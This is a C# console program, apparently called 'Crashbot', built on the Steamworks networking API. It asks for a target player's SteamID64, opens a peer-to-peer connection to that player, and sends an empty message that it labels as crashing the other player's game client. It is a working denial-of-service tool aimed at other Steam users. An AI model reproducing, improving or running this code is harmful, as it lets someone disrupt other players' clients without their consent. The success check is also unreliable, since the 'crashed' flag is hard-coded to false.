﻿using Newtonsoft.Json;
using Steamworks;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using static SteamKit2.GC.Dota.Internal.CMsgDOTALeague;

namespace Crashbot
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Crashbot");
            Environment.CurrentDirectory = Directory.GetParent(Assembly.GetExecutingAssembly()?.Location ?? AppContext.BaseDirectory)!.FullName;
            Console.WriteLine(Environment.CurrentDirectory);
            File.WriteAllText("steam_appid.txt", "387990");


            if (!Steamworks.SteamAPI.Init())
            {
                Debug.WriteLine("SteamAPI.Init() failed!");
                return;
            }

            Console.WriteLine("76561198299556567");

            start:

            Console.WriteLine("BLoggedOn: " + Steamworks.SteamUser.BLoggedOn());
            Console.Write("Enter target SteamID64: ");

            ulong target = ulong.Parse(Console.ReadLine()?.Trim() ?? "0");
            var steamuser = new SteamKit2.SteamID(target);
            CSteamID cSteamID = new(steamuser.ConvertToUInt64());

            SteamNetworkingIdentity remoteIdentity = new();
            remoteIdentity.SetSteamID(cSteamID);

            SteamNetworkingConfigValue_t[] options = new SteamNetworkingConfigValue_t[1];
            options[0].m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32;
            options[0].m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutConnected; // or another relevant option
            options[0].m_val.m_int32 = 50;

            HSteamNetConnection conn = SteamNetworkingSockets.ConnectP2P(ref remoteIdentity, 0, 1, options);
            Console.WriteLine("Connecting...");

            Thread.Sleep(10);
            Steamworks.SteamAPI.RunCallbacks();
            Steamworks.SteamNetworkingSockets.RunCallbacks();
            Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out Steamworks.SteamNetConnectionInfo_t info);

            while (info.m_eState != ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
            {
                Steamworks.SteamAPI.RunCallbacks();
                Steamworks.SteamNetworkingSockets.RunCallbacks();
                Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out info);

                Thread.Sleep(10);
            }

            Console.WriteLine("Connected!");
            int maxMessages = 1;

            while (true)
            {
                IntPtr[] messagePointers = new IntPtr[maxMessages];
                int messageCount = Steamworks.SteamNetworkingSockets.ReceiveMessagesOnConnection(conn, messagePointers, maxMessages);

                if (messageCount > 0)
                {
                    Steamworks.SteamNetworkingSockets.SendMessageToConnection(conn, 0, 0, 0, out long _);
                    Steamworks.SteamNetworkingSockets.FlushMessagesOnConnection(conn);
                    Console.WriteLine("Crashing client...");

                    Steamworks.SteamAPI.RunCallbacks();
                    Steamworks.SteamNetworkingSockets.RunCallbacks();
                    Thread.Sleep(100);

                    Steamworks.SteamNetworkingSockets.CloseConnection(conn, 0, string.Empty, false);
                    break;
                }
                else
                {
                    Thread.Sleep(10);
                }
            }

            Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out info);
            while (string.IsNullOrWhiteSpace(Console.ReadLine().Trim()))
            {
                Steamworks.SteamAPI.RunCallbacks();
                Steamworks.SteamNetworkingSockets.RunCallbacks();

                Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out info);
                Steamworks.SteamNetworkingSockets.GetDetailedConnectionStatus(conn, out string status, 255 * 255);
                
                Console.WriteLine(status);
                Console.WriteLine(JsonConvert.SerializeObject(info, Formatting.Indented));
            }            

            bool crashed = false;
            Console.WriteLine(crashed ? "Successfully Crashed!" : "Failed to Crash");
            

            goto start;
        }
    }
}
